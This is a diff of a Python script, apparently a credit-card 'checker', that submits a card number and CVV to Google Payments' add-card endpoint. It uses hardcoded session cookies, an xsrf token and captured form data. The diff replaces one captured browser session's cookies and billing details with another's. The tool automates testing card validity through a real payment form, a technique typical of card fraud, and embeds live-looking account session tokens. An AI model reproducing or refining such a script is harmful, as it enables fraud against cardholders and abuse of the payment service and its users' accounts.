@@ -25,25 +25,25 @@ def check_visa():
     cookies = {
         'OTZ': '8178671_44_48_171240_44_319500',
         'AEC': 'AVh_V2iLNQRzcEXTF3vPa7OKyNp7A_CPeLY78RHTg_Y55fBBgXwzH3XI4gk',
-        'SID': 'g.a000zgiGj0MNCQtsdJVaFqIpbBRJaG6BXR-TIJQq_y-L7THrdF9y0R8blvBWxyKVop1dB-LzxQACgYKAYsSARYSFQHGX2MiLGRerWAVi4aol_TrV4Pa2BoVAUF8yKpm3t5HfQ1SX7rBLnrASRvR0076',
-        '__Secure-1PSID': 'g.a000zgiGj0MNCQtsdJVaFqIpbBRJaG6BXR-TIJQq_y-L7THrdF9y44nJm3Sq45burDbEVibCQwACgYKATsSARYSFQHGX2MibzSUWf0Emc1ltDE0EWKe4hoVAUF8yKrbsxFKV_q8httMZQYRkGaN0076',
-        '__Secure-3PSID': 'g.a000zgiGj0MNCQtsdJVaFqIpbBRJaG6BXR-TIJQq_y-L7THrdF9ywMwEqGno5ivmeRFRTS3xgAACgYKAewSARYSFQHGX2Mi3DG7Wu6DbkP5HVi0RKtGAxoVAUF8yKqhAyYujKYCwcjdFEpgv5qt0076',
-        'HSID': 'AcT7Y7LrggStXYL37',
-        'SSID': 'Akdk-0erb1WOkPTxn',
-        'APISID': '-apT3e7qBzYFV8rs/AswNwAUStzhcQQGY0',
-        'SAPISID': 'P6ApJxXeYERQg6HZ/AwDn7umN1ACRWNsKx',
-        '__Secure-1PAPISID': 'P6ApJxXeYERQg6HZ/AwDn7umN1ACRWNsKx',
-        '__Secure-3PAPISID': 'P6ApJxXeYERQg6HZ/AwDn7umN1ACRWNsKx',
-        'NID': '525=esAMf4wzYu21EI3xCzuppzebp89JbNNKdH1UwsVzs-5Tya_G2da4gy1ltSVrQXoMil4klwwykc0c3RXMrroao8mARijK-qCxBcwXYN9vHKMla538NIv6HS8ZUgnGljgImmdStqlr_rMFbZBSkh2zmsu3BXs98PFXVoaH5GzvyovQcBSAa9Q43MOg2qqVHq36tEGOGmOvyFYBJCIUCIQK-dsfJQcjlBpYJN7FZBYDIavMFn8Io9G5kGMsmrUF3f_-iYEgFRzGFeCf_8qnmg2Ys5st2f2deIc2_tWzZglb3ORZ7pphWoqr6om30baxNYTNv_19zqaDJxbAOxENMp9qmEaJfN6nNMDEISnoQIap_jecEahnlJUsbm-tZijdGwI7M7qpDlovBrsUAes7BtXvMgv59aDqRskNedflR1KHNjDaDlF9bzAzyC9pLgDyy5iB2GknTGvreECQel_35qxMfPt0U_W10m33hbn-Q4MzrK8LEKxiVlyqoBZcOdNJCZJceuNF1Ax6nuBa-gNzuWIQNp9KVUGGwtCBPeyKW_KnYVW2Oi7do0TNTaV6GKYDNdNL85Db_sydEiVzZRb7l9XiMtFSi1ANG_UyE6q5NjmrUs-LC-hiUHQ1shylaKqlq1UeMZQpxkhVxiVqteNYuUPtlLS1LG-fL9GnrXzzofj2SDwXihcP76tIAINUdSwp61X3GUS9HR_yyLF7oD4kgRnYRFoLCTBEOugBooa-cDzFKLExwhHsrvqdS9KpR6y05Bk7PUBfBaOmEobBoJou9Lvdk5JiPGyc4pGw-d01x82idH0SkiRfAA-QF_gza5SoKfKNweOiCl-anLwEEZVDQ9y640vasFx_fnnL6gzDTdrCXtRscIdni0VeXSvoZcHMYkcvQvJDDA6BHo_HqkgQ2S-iBWNNv3k48BrcHpWoCLZNMel2tXDQ2Dfwkb3EkG0YXYaA6vjfmSBT5ZMtm3zGbPHXG4t-Yxc-UO-tuiSy5gH-jZKIY839tf37j3JA6XKKwcz-gn1w93sfobZSdLIUjcT9HTkptuExaWmNB775WNWZjud2pamMG5TUsoMeHcrXtrc1UCyiJT0EHF9Mt0IcyYfeA11ylvuZNOhGRv0_OmmMDNVP-2BGhUf6X87JWnObGz4',
-        '__utma': '207539602.2100594883.1742201890.1753633479.1753641075.4',
+        'NID': '525=EDZnOOZEfK9IJxYyhq8--EsvOv93m_-1R_Uqmf3c5Dno-FKAhQ16o6agofkp9T69bm7VAE_dz_uAaXPx8EoBdAw-HrURaKkNL8ElBYhW71MNjVhLuu7w40eDFT6m3ENf5e8QHBFGZZ6JbGeZGVDctVzZexZM1WRphpN534XeqCfAQieEMkLCsEWQQDuldMwovMp7am1_4QY13bZHez-PWUei7nSzmPVZERuD8Fnn3qN8DMeKAL5ZVOtfnKiif8ykNDiBcQklsT-lvqfRC5Gzp158Gf5DgZapRVrPNYRDvlPQFO_d6JSKLGJNo_h3L8RPhyYDL4QYPYHKzrEBUHxVn_t5-ZDDtFvGq1p1pYWxN1s-noQusuA84enJtFJsG93tppxFz4cW6g_IfWvo2DsuiWqlWzs9VeBK4aVrR5wxkgRzYr8DfF_7kV7GZZ6ETMA4IkFyt-Y_evnFU1QveWbyouC4Gt0pjp86oSJTvKNAgRGUr8Czv554JAjmy-7tgLeiGGR4hX7A5SJf58biG7kzUeIMxX3S5VlyJVxickXxAIQm8-pj9ZsPMRdJUr-i8XyL7z3BIivARJh0fkXgBgIDNFReoVU6fjeM1B99CLFlAJTieR9Jy2rhyjJE8va9XDSheMzNe_M8JqI9yZyFNrFnJ93mc1x0Nz972q9-Fu7f1Z1QDVM_xGkTsTRURkK7zRtBlMDQz75OxSVC9FZiu0jXAuZEic0h81Jda_njIXKyyRusQwS0ka24hd78y0JTzJL9smpAmG_9xrpw7ODRstdX-EiNOTzSNkpJYUKHMeyTAy1evg4jtR28tPkhfk6_eTTb5Ds6eROu_nwIoIpgUGp0wQr53QrSpRkTgGVq9Qca874w6HPNUnaGxyavs2JZhCjdg7fTSe-MeSUai2MKj9m65j5w5UgBfa2gN9HBdi1eUUd8rE5V0E-HBIKUSUwF32zci9n6muJ6jDStuG0KUo1zSmbSRsSAh_wGqYebTQDdsBLrg-ZVghNR_fvwlj3sR9WixDLfIus_wVt78ax333k1dnnaO_LFTYfJ062KEWbYmmCddJbNek7SsKJxHIAP44P3K4ZghVcTkrvIsJUuw7KQQnSav5e5dRJQjZ0wZqEpHSwA5lSAYc5Qi-JKs2MN',
+        'SID': 'g.a000zgiGj7JLPqknlTzcd8r7SVTSOyRYIM89xxNjijaQtmLVl0eVuO7pTCPva7sn0FQ8CflwiQACgYKARISARYSFQHGX2MiSCi4FlIgiH7ImzQ11-KzrhoVAUF8yKqY_Aj-Fv9Llkm2VGLmUM2v0076',
+        '__Secure-1PSID': 'g.a000zgiGj7JLPqknlTzcd8r7SVTSOyRYIM89xxNjijaQtmLVl0eVvGuRCcRLadRtFhS36jxKYwACgYKAQgSARYSFQHGX2MirchICEzeFedNhZ0vtxd5xRoVAUF8yKqx-1WHeKOLrqTYTPuLHHRh0076',
+        '__Secure-3PSID': 'g.a000zgiGj7JLPqknlTzcd8r7SVTSOyRYIM89xxNjijaQtmLVl0eVnF8eHO4ja2MLFGecbN_J8QACgYKAYQSARYSFQHGX2MiSVrooXsvS24OZL3irGFBqxoVAUF8yKr4iKExCv1E4FvFM44O-ZXX0076',
+        'HSID': 'APJS_TaVdn24EEIBQ',
+        'SSID': 'AF8ZM84MsejkY-Pym',
+        'APISID': 'MPO5KiSxe2oBoywN/AzBxLLRAFxIkftopS',
+        'SAPISID': 'MZoK_k5Jfz26i8UL/AlULB6vwXTgX2hMhX',
+        '__Secure-1PAPISID': 'MZoK_k5Jfz26i8UL/AlULB6vwXTgX2hMhX',
+        '__Secure-3PAPISID': 'MZoK_k5Jfz26i8UL/AlULB6vwXTgX2hMhX',
+        '__utma': '207539602.2100594883.1742201890.1753643295.1753693869.6',
         '__utmc': '207539602',
-        '__utmz': '207539602.1753641075.4.4.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
+        '__utmz': '207539602.1753693869.6.6.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
         '__utmt': '1',
-        '__utmb': '207539602.3.8.1753641075',
-        'S': 'billing-ui-v3=5LksvM5yHJe2JnUcuF7aXJrdkhAffQvu:billing-ui-v3-efe=5LksvM5yHJe2JnUcuF7aXJrdkhAffQvu',
-        'SIDCC': 'AKEyXzUmCjkDBoIeUzn1MjLKT0UJCxiyIoVnCqlnhdnkfInjALuOLuHegYe2lY4zB1S9Iw5A2w',
-        '__Secure-1PSIDCC': 'AKEyXzWvdGUUC7WdaLjBrS6WRoV-UsV8xjQ_-Nu3Ulw5G0tJzLQFQLwJkGNBgLqV9dQ071eoS5A',
-        '__Secure-3PSIDCC': 'AKEyXzX9wPLnze1ZbNSySoD9luy0pFb1-Vscsm4XIFeBYhw7yaAsAFZu8teiJfo1bkdxLRM_VPM',
+        '__utmb': '207539602.5.8.1753693902919',
+        'SIDCC': 'AKEyXzW88EIqiNMDtu1c44S0GCLL5xkr8H8wCkUE8SFY8GXe9ntQE8A2c2poiWG0e774HTDy4A',
+        '__Secure-1PSIDCC': 'AKEyXzWRVuoQYLOzMiGsWqREL_CvM9je7CCnkNiPElNrQbt7do2zFm5AXdx7-MAQf6i_MlKVA8c',
+        '__Secure-3PSIDCC': 'AKEyXzVtOGPQPUYnyZr8JTbkwwIWRSl6WAqWH_IkQFtLnTz798bhq2JMIfHyjYnK5SL8fII7sKQ',
+        'S': 'billing-ui-v3=x4QaCJUL-IGRIAS84wc-n84uWyRV1yoz:billing-ui-v3-efe=x4QaCJUL-IGRIAS84wc-n84uWyRV1yoz',
     }
 
     # تعريف الهيدرات المحدثة
@@ -53,7 +53,7 @@ def check_visa():
         'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://payments.google.com',
-        'referer': 'https://payments.google.com/payments/u/1/embedded/instrument_manager?tc=96%2C87&wst=1753641061750&cst=1753641072042&si=1114862205518669&pet&sri=2&hmi=false&ipi=vlo30z3cgvwp&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_x5knek8h43tc0&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByCmn9iv1Acg9acEYgDAAgD4AwE%3D&spul=500&cori=https%3A%2F%2Fwallet.google.com',
+        'referer': 'https://payments.google.com/payments/u/0/embedded/instrument_manager?tc=96%2C87&wst=1753693850694&cst=1753693866137&si=246936212199323&pet&sri=2&hmi=false&ipi=a2tnxo4pivle&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_k28asla29l040&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByDD7%2FOOvw8g9acEYgDAAgD4AwE%3D&spul=501&cori=https%3A%2F%2Fwallet.google.com',
         'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
         'sec-ch-ua-arch': '""',
         'sec-ch-ua-bitness': '""',
@@ -75,29 +75,29 @@ def check_visa():
     # تعريف البارامترات المحدثة
     params = {
         'ait': 'GAIA',
-        'cn': '$p_x5knek8h43tc0',
+        'cn': '$p_k28asla29l040',
         'eo': 'https://wallet.google.com',
         'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
-        'ipi': 'vlo30z3cgvwp',
+        'ipi': 'a2tnxo4pivle',
         'hl': 'ar',
         'mm': 'e',
         'origin': 'https://wallet.google.com',
-        'si': '1114862205518669',
+        'si': '246936212199323',
         'style': ':m2',
-        'cst': '1753641072042',
-        'wst': '1753641061750',
+        'cst': '1753693866137',
+        'wst': '1753693850694',
         's7e': '3.1.0.0;3.1.0.1',
         'rt': 'j',
-        's': '2',
+        's': '7',
     }
 
     # تعريف بيانات الطلب المحدثة
     data = {
-        'xsrf': 'AJWlU2MJEn7dsK0aJHaTGz-sRa98o6ki1g:1753641074316',
+        'xsrf': 'AJWlU2PU60sh9JErZcqDfDy5lycG10YmlQ:1753693868715',
         '3.1.0.0': card_number,
         '3.1.0.1': cvv,
-        'msg': '[[null,"ACo329y1lXWEPIWZoeiUL1cxrSFeS8Kr86BM+u6jSS0DmMAbcMIvj7s+5QqPjBdGUQInOlXliHqwfk4gmkdcdavZXeBGjoHtIw5EMWTHaQL9PVn8+5/Th+tyG4M8ILavH/KpOPUNXvgLMp4GRNgIUGveB7RxNLsiUSAMHFykBJO4THt2VGWOhclz49H8L+BRsVFEUy2DMmi0p+4mBG3cnbHPyijNsZkNzNITUd0ru9+KOql1FGfyUtbycs4/29dCnLxIPx+2LxEm",null,[null,[null,null,null,["!j4yljNTNAAa73VJ7m91CSzkoD4KEDaw7ADQBEArZ1F-pC4Zyrkjah2jruZxLjma7AC0yDI5-GgDoM2VRmHHYtjI5M2qmuOnTcIhA6FnMAgAABiZSAAAAMmgBB34ATJQ0JGinZlcQyHsLnG_unyV-IcodJPqDOCvnv8j7GZxt69W1LzO0nCj6vHYgp0UXbN1O30li2C1niMPwX4oj4Q6BMMs2O0Vdo_Udc0mZCrDnod4StBJbY53v27c66DNw91QEsDy1d9fH3SW-10WfQViVQA6Sai4TyFBLh0E-yFYMq7Bn7tePJmOGhf_V2LKSp5GkRJdlILMTuheAV9vlU0j-U5Lb6zit_G8yLLJcZgpZ4AbwJOZmoV63Q369J4pgv7ROfaQq5iMW6kihAHVUAiAfIeOPvzQnXu70v4hAdoPL3B6Z4h7mJXVmxQGESnWSO57sFwXIS8iooJs2IbKR6ENxquzYAba8rdQfo84pZ1lMBLrP1lzyJ9dGttvZwjt2h4qP2moh2DhfRxsUFXHBIR6ruVUBaXije8juxZf-hxk3GZGt3MZ1U1ULaLHdEblqe4s0bdXMvOEoC12Igy0_AdGdbjRrsqMSWbNY6pOs8yZXhqT4Q1KlYEFZZBOSxXDsgk97Vw_fUBWeo8XKj3wKHUmbMa69ATXfxaMwcC7bYrkzjj6HK-HVJ2gZreO2b9FRB2cd7S6oOtDrvds4iLaYdjtYkaQPZsrJUR6eMnJut4QM5rPiYKkjQ368p9V_9jKUCk1SCQI2HtRXSZP51yM7iReXSTDFbG3Wim3aWnipcXv192jKTfP03f--bklm6hoHuWUzXM5IDw6hHY1qpRznu8pFRMgnjGxhqCoFSE43ljdRZNe9memV3i_RFQd2G9ZAjl7KNVY4vy-pTgBA7n0bMAqU9woOB51tZPliDE_J-xNclTj5CZlX1Vc_xXXhaW9KWefuBbs_o_N92hHE5BVzXntPA9m4iN0uzIHlog5q8oqNA_2MVVniSeVGhdiQ_462qS2hozxpcfG46ua9pIoLwFfe8-uA52fFg-kz4wuK4XuopjtADkUygHnw_DGDKKFv8kaXKX6RUMIeayTVcmfi7xV-FNHA-0-QOQ3XHIiocAxHJoO926qGTUF5PBX54NExQ-aKZ5F95ZAtaJNWw3UpA3knI053_DCVuLy5D-scFQVZ1DNRaguvvVonc0YMlgHGLyMhLkI9HbUVrISqgb7c2S0n3zzobo517oyE8p8FGglkiolPCmW2a15x3zPYYNKfx3yrkGv20MI5JI6K-_LUPVZefBJhuw5ECXPZX-etdusHIHY06oEO7ZRAVq59iByxYpGRxqInrggOw48JRjCGk1CfoYXGfM7m1StoiZOH1LaY1m8A-OoppS2213QzeKubmVLGSB0mHzBZoms2U4vuC8GFJ54I27dprWsOJe4D07I1_D-Oz5rPpjdrojBQ-e1IIuPCx4gukeN-bIx6TK_n8S2l44kzUyySXHjuSeQ8GxtDCgkHEJeU3L_2ragKW2W2jtZUefvYgM8viwk57KGj57USoyLcQc2qeZWaUgchBhZF-oqU0zx9QAVzYvtYr0a4M7y9EJCvNKmKYSFxDY-14dCbjZhV29t0qjXWFv0OrwaIlIcJUHDqidtDbLN36FzeO_rw-F9HfKqlUk7X9ByU9GZtfN2QCdYN9oRnW-ljw4yYaqcWytyCUJjh6_U8XuU1ztRf7uMzArUrE3uxXl4XZp9XOUpyh_cVdFRQ3MTgWJMzoVGLu-YgXUV3Owc-ZycumRpeZaX5ADpxKh1DFfx2L2aEKQNmNsE8MMkT6xNjp1wLBLQ6pnB0NYdjIBzwp6-CH3CHriQIhKehx7HLT9e2bkYmC9o2qsBonVaNbavA40OW7bIcZ3LL-RH0PK8sEJbTPHIZRkv7-JNUp-Y6LSFnZyBS4uz94MnDy-QMMAQtUPf-d4nbhwYZqYB99qRueaUEis9pZe2-p-rPDnMA_XZg-5mSt-nnzuGmpUSyysLb8y3snRv5jaeTDALHQWF3WqXniJliRgePhFMCnVTiJHV9BKiiO7ebNi6aKY_MMwIhXCFnuvs6N2YKbX1nvVdoLAajSq1yK4to3J7iKUXcfQ3TiZ5xn1CxBItZ4ab71aRSpyazexrU27-zCJ3Ywvo0u8JyE5LrCWZDd1Wtag9syDl9nBAVmVsMQP7MFjxR7n8Wrkx3R4pGCnTVmYkAamtMgD7lAQ7NQtx6hGZYIg1Clc9Qs4LkqX1GHie9pg14o5v9dBdLSWLeUTeOQYvpoqrdAQdTILvQKrgq_RDmpb8QK-xg7gQVT7B2XGrlLvCJCtQVhkOl6DTrfC2L9_ds_ND_9bgJb5QJTHyupMHjSJMAvGOXCk8TV2BiA4NhAS8qgRrci3l5iLV6hL9ogX7sz8DYKpm5__ofpVZnJP8sfA-biXLYg1lknfmnXFubKsYDmaEpjT2h-MAxOk1TTPth8ixbKp0raUGmaGI4kpBe2wPG_0xfTBHpSDeOwTwWcjbuq8DFcphRPAOi0MMRb0kIePNwUhFUIqjWNF62YbHWhQ4_Y6lPIXQO24dg-NwVZp98okR-LPkV1yXTLAZoOnZBu736ggeKAMCbdtnI8mjBRCaiaA_L5mxTt4OrsuVV61wEoSnJymJlYrJmUCCrmBHfV5c3kFWbCKv9ZdP-RUJY7g-7X4KB8sou880ZyUqkRizjHVReTArZZoJeyWMRNDvY3FscoW0psoYnPcysECAxYuZJ4TZvWlx3MghWYr_uZVFWLFSKxZ81W0KVbx3R8h3szjqDg7vfBEXumagxWjwSMmfDzv1W-eY9rH96T5qMCP3QwIFLMIaTAIg-QCqdmY35uUjP7eLl6MniGlBo7rtX6R98QTcMAt3kOBuAj4BX1N3xCzR3vnJXN8VmXrB8SsVmAB9QnyYn1apLAmbcvQBUuAm4HK97E6u9DIjzxdnu3aAbEXfTKGrNfw3qGsxoc-D2GtP2KC5Or0yamxrL1OIbbmt31VKPkqoHKDtWVgp3U-VXdzcwykkNtIAfIRwqX3jFbQ_eD74TVhfTH6N5yoideU_BySEYLfZab-NSwA1PDPCaDS8kvTCwqYYd_KJWo32AJD54oHfTq9NAMmM0F7zsrGj6Fhg_qvV4T1orHJ0MEuD6glUrOdPdUSxYB2Wt7p1qDZQVwSvKHV_W-Zjhns4TJkBx7FfbPirXnotGpDeG1edEjTPEdyCvXxzJJhtp22UoGkhC8jDGlHMoYE4-T-sd4e9xpEejBaUMPytDqPo24t_TWrEogEx5XZBhKFK3pAPpd6nxkfcoCm6MYU3D7MCgQDvufKLp2q8ARhQWy3Bj6mOpGtEJsSvMPNFo0kmz1hGcwGSSCq_x-rZfdAnD-QtdX_t-YPrZGpWnh0hSswTmSNwV0k3myddbuvG5m-lyo3_ntL0Z7HCwUmhjRwC_EvCs3142-tpbTSuYCUb-C4wj9JE_9oXEqAHWXb6ErJMjVDrcmJzQQ4wfaeZuGxiZfHf3bJL_qcc45jK0Pigndp3-kZg1vOzJE_yQIeBBYq0JcgNhxA_vAtblNcCl1gTf3kyt-PkkW3kDBNR42tARqUr6r5b3s9k35d8uO5nSPNgZdlRuWFTpI_CykwcpusIZGcm_csWIRun4xW0XKOVT8zlby50Q1O513sZE2IQTQsnzZNgbaza4QT0l0x8iqVtDBDDLwLSPe-9Zn85pn3Q0monrQr-Yfr2qGbNumfgxDzRrieHiU6phsaoRrx83FsIfRQwYab2u-60tZgYoVJAdECRVomrv8hwyG1bvJAJ_u8dbK_FIWNqtA4WbtE6NzFbeDEYUnie_SxOmoyDKbOsrs_P3nM_qWjOdg-A"]]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",1,2030,null,"4966",null,"__s7e_data__61bb463a","Mia Reid",[["US",null,"TX",null,"Plano",null,null,null,null,null,null,"75074",null,["098 Fairwood Village","Oisoddn"]],null,null,null,"billingAddress",null,"CggIxLmJwwIQAQ==",2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
-        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,1,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,3,e8,7bdb49f6,0,95,b6540200,0,140,eea820b6,0,236,1aa4331,0,"Linux armv81,f54683f2,1,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 2028KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,0,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 2028Linux3b Android 103b K29 AppleWebKit2f537.36 2028KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 0023a003a00 GMT2b0200 20282a48424a2a 20343142 20234831482827 2027443133454a29,770c67fc,1,7:a21,3,1984d273c7b,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2c4:a40,"f,1984d273f3f,"n,0,0,"t,1984d273618,0,0,0,0,1984d273624,1984d273624,1984d273624,1984d273624,1984d273624,0,1984d273636,1984d273a30,1984d273a4f,1984d273a51,1984d273cb7,1984d273cb8,1984d273f87,1984d2742c7,1984d2742c8,1984d2742fa:a10:a31,3,"h,1,"p,63,34,"m,3bae,5c2,1a0f,1a77,5962,1146,6f81,653,32b,15eb,56e,bee,f57,9b9,2b3e,a75,19c7,b6c,1a6a'
+        'msg': '[[null,"ACo329w4STUlOA9wD2eGEdqyb6E9DmNGHbfK7ITGyLxVw+PNyhfD4bziEIgeywJhANuoIsA8l+jITahijWXbYD6CFSbvVoOJ4z/8HbgE5qtpGq5jt2Av7/LnLZwGJE+7t1Ggfbj+YAylu+U+CnQh4pn7BBCsminnBRsEoR+wwPa4Ju51id4xJR/OItsyxGSVJrWHTkFOqpdQqyAxwf8Vf+pRP4u0X+VJdN63Ih4JlTwRsKlvli6KlHUjTI4vcDssqmRG8U5+dm9t",null,[null,[null,null,null,["!8POl86vNAAa73VJ7m91COPcFFCjPPnk7ADQBEArZ1DLzpb0mv_Ab-cubIptWT2XX0dfddfzo8Q-w8C4vT6_Jj7u1IBVKtfFKf8RZhSJ6AgAABSJSAAAAUWgBB34ATL5ZXKlYjmN3_Tp40mygElBdxj1CCDM73hrtVgkv4WdI0p8IWhtn4Dl7VV3HvYG3zPqYWR64MJqViqaMNi3pPe7glcmtzEE9MEujBc-ZCLIe88Jc0eOPHSelPjfCOxgoTcVFcrnJiVxqMBlIiLLFlutioHjGFLB7-MkPHSM7w5DFTptKFGcknUfzI9DHw2krdOK1_FI8LBKHRMrrWlTanGC-7sFyv-HLYaWNlwQYJE87_valJOZ9POULWbSpPxs1_Ndy7TineESPEjGDRaTgD0LDKj-jzPdvgJY7Qgnu-g5FpnJB9tqlSAGb8fHRCKeaaV-J6NTHxQbJrp4o_9UXNPz_tu54Ha4mlFXxZPBGa9fQCaYyKmbvITeoZ643ZpuqodwkOHKk0rtU3aCqr0m6PuqejX8ud_T3MNP9ybf3Wk3HqmAkidXx_JKHf7tukqRQQe_M81Yo--ab45lxWeXIC6jGcHS3AEsBB5296mTV-xVWw05eNZzibYa5f_QArfwjm8yGiGDDry1rfZnpph6KjW7qFq5kmpDvx_ex0awBdX7bibdlmiIFlnZFwjHbQh86w1rwqK28kOTfLzmhqHQzEa5x1dQEOJQtxp6DJAsQdgDgj2HldZ1xbCTbPCm80L4RGm7MEK-0ZbcoyZsXH3o6_-0Xfo77gF6JP707dX2v-cidkPxP7vrF6-6XjaTIkYJtYMeeHYkzPCyLuj7uGpx3bB6la-sefiCD_PTOyM4xUoVSgu5K6Jdt6aAQqHelxEC94v-H3sQ0-Xo0BP_QDcfMwmNjKQusRx9duqES0SJ3iHM1-KJLh8ZEW6zetB9AfAhz7wR-xU-S01vQwV0eUN4fos3WIxQ-2kJnH9Hq9LjcMdXOObvurWi_q7FNHWD6yZCYKfXcpRcWR1byc8NdPCUIjy1cKd7Dp25j0Hb55A1xjHGjopv3oRQJHs0Ysdw5QIdJJTUguw0hpHeJBI60HvGiimfi_OaLOOnkxVqieTBvfZUZyHmYptSPxbHVZCvqgKw0YEvHOalqtsjUr5U-TAc2OD7VIAjMxO3t5bYbhmQGcoS51UOxrMJs7VkWIue6sOwFQWS6DvfjMm4EwUBLMh33FhyYDINk_fO7F1YrZxp3qOi9PoobqbI5jx1U_9R0Jcn_4C0L_yvVgWAwaGAVsRizTjlirOppdtgKNi0LMo7MWdXP-geRIDBFQfkbO0ZrmSjyvJiU6rzYG-BRsHHYHVYjY3PNjUZ-jhuHtcWkX7p4h4WinES-HtpcgyQ9CZLHkG-HYu2dB8amKHuDDTaKlCfC6hFZEu4JoydCcyhycLxaXt2rDBK_GEKshW8sf-rFJpRAG9ZW941c7aRvAOrx9lW1pHHvQH5igrnmhXvjk6qdlO4S44S9tOAoGYlSb7Z04XlEMPtS21kX_xG1qNzH-8Ax2rFicG6gJ4HImAroG4505sLWoLFbd629Xoo2h4yeO2GJnINC_o9i1OVxNWAdZaMA8c_z_rP-TPelmZMBOye8EDktQ9bk_6Tk4hXdtNShBlo6BVaJK3KquMihppz88RhJ6BnxCKMTCkd0Y_tq4GPllJTuqhakcOoR8Z4L_DNaf_XCeKJWn0N7CzhwUhVi3dd8A0f2S-dNs8pAj1NxIE8Aa57GHVYIx8VqWTf87XEzIV275j2BeKCYg69xuNqQx5EPz90iHSpLREHh9FbwytYcMXlDNJmtDw2XFObEjmt1C5tFlZCzOKdYq48JoyHSTh9DjY9uTTg-Rm7APBTICeLyrZQGRTdohU3eyV9igZiy2CoS3Dscu3J4atvlL7LahBhHSwF5dbQnp9OQnZMKv9RBTEFZ273_Crl6YSQ0fP0iFsTNdfgvjw2w0rJd71f3pFGi9e34ILjKTa_5MdoZC9WtW9sx0hpGSxYOtqi_PjvRH_alPeFD5NdWkWOvI1nD8CqVjSQy8sg88Y9uyJG0kw1LRb7244ZbIgg_Nx1M2GukSa6FiCxq_cRy-bcw_oKuMRH1aZ0djZsdGC4S_LBT2sqcfaw_kMek3yV6A8aGN9MW_W4LNiYqRaAWGyPx2NR4ScDoyUnIkbMxtXEio89kcMkfAQsvE1z9MylysGroKxr8P9f2-aHIOvedI8ttjN0x43xY0YqvlbtxUB4zSbKTISCUJR4d7DXlzD8mCLm8z-YJiTsTOAarJm3D_jtRXnCaWvDViOo95fA8KPMWVZsdUq4zVuIsKol9NGizJxNdC0GCutThHyZi-LUESupFPbpicALtitmawTNlp6PI4w8wsHNjL4gendLhdudyZXJBlfWCoYwgL96q6tvhbRcOVgkAeYMzM8hcbTCmh-1LxOfdx3PiPtbQJWBZZg_8_G3RAdjGnpNDkQYFl6qCDfig2iJ-0hWD0DS5OZTEn7Xh1v8f3TifY5rCkEzrcXl_krPMCQ5TTOeOF_V6vF1MEGia8U5q05ZJHoB8Rc7xfLY9-NCznlEgPeIl_KR_PJaOsnNCDDmwG7LbqzBTTOB6a8cH2I1md6JUFoHk7Jj8GYgNPTMWwO166-hXD1GIfF-OWAda2X8uld6VCUhmxpOF3_v7k5U7I54VRxLEslNZ2L4HaYvLaspJ_qmGpAMNlnf-ej-aXrkonq7JkukKD0hQaeX7uQd2LfQXh0YRI6fFKqJFhfZTPUdiXihp7ryYMT45rjlyA5w1kXgTtHcIIzjYQfxgRubs_IjfToM47Rgi0s5RdUQurtWGaGm344rbNnurRZVd_UmroNnI0KSpjjAqKF93bL7KrrfcW9Ra5b4itrOQ8-sJZjvjWKgyFr2uBtxTzagYowtZL-ZUDtC2--6maKHsJOaUnSR1ByzepCFHdNWbKpIhuvIJWnPLlMTkyUa7bgwK5LloXFq_G5bNCjRGvV_MjvYKTmsxrO_J9WyoI3WRaA7CKv1X3QJgC_g3HbYMZcFnPzfOKRnQdUJSJWIw9pIVcy2os5cuvha3JBFvuS5iMoqOvPNypngXhp3MfgxwMh2EW-drT8_V3-q2I0W4Fnih0MDYJqZYtBqKv0-0P_kzt3YlbyA4AT1WU-mI_byjISmoUv4Pp73rIVI"]]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",5,2029,null,"3888",null,"__s7e_data__61bb463a","هونجا البونجا",[["US",null,"NY",null,"New York",null,null,null,null,null,null,"10001",null,["Orjreiejejrjdijd","836393"]],null,null,null,"billingAddress",null,null,2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
